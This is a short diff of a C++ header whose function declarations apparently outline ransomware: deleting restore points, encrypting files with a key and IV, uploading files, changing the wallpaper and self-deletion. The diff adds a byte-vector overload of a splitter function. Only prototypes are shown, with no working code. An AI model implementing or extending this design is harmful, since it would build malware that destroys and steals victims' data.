@@ -55,7 +55,7 @@ void ChangeWallpaper(const std::string& content);
 bool IsConnected2Internet();
 void ScheduleTask();
 std::vector<std::vector<std::string>> VectorSplitter(const std::vector<std::string>& baseVector, int parts);
-void DeleteRestorePoints();
+std::vector<std::vector<BYTE>> VectorSplitter(const std::vector<BYTE>& baseVector, int parts); void DeleteRestorePoints();
 void DeleteMe(const std::string& myPath);
 void EncryptFiles(const std::vector<std::string>& files,const std::string& key, const std::string& iv);
 void UploadFiles(const std::vector<std::string>& files);
